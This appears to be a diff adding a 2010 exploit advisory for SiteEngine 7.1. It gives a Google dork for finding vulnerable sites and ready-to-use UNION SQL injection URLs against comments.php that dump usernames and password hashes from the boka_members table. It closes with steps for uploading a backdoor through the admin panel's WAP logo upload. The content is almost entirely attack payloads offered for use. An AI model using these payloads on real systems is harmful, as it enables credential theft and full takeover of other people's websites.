@@ -1,0 +1,35 @@
+#################################################################################
+#Title:   SiteEngine 7.1 SQL injection Vulnerability
+#Date:    2010-11-25
+#Author:  Beach
+#Team:    www.linux520.com
+#Vendor:  www.siteengine.net  www.boka.cn
+#Dork:    "Powered by SiteEngine"   //300,000 +~
+#Language:PHP
+#Greetz:  birdarmy
+#################################################################################
+[*]Description:
+   Exploit this vulnerability comment must be enabled (default == enable)
+#################################################################################
+[*]Exploit:
+
+Enterprise Portal Version:
+[1]http://server/comments.php?id=1&module=newstopic+m,boka_newstopicclass+c+where+1=2+union+select+1,2,concat(username,0x3a,password),4,5,6,...,38,39+from+boka_members%23
+
+[2]http://server/comments.php?id=1&module=news+m,boka_newsclass+c+where+1=2+union+select+1,2,concat(username,0x3a,password),4,5,6,...,26,27+from+boka_members%23
+
+maybe have a different number of columns , you can try it ...
+==================================================================================
+E-commerce Version:
+
+[+]http://server/comments.php?id=1&module=news+m,boka_newsclass+c+where+1=2+union+select+1,2,password,4,5,6,...,37,38+from+boka_members%23
+##################################################################################
+
+Similar to other versions  =)
+##################################################################################
+[*]Upload backdoor:
+Administrator Panel: http://server/admin/
+
+System maintainance -> WAP Setting -> plz upload WAP logo(<= 10kb) -> OK -> 
+Browse Right Now -> view properties [the URL is Ur backdoor]
+##################################################################################
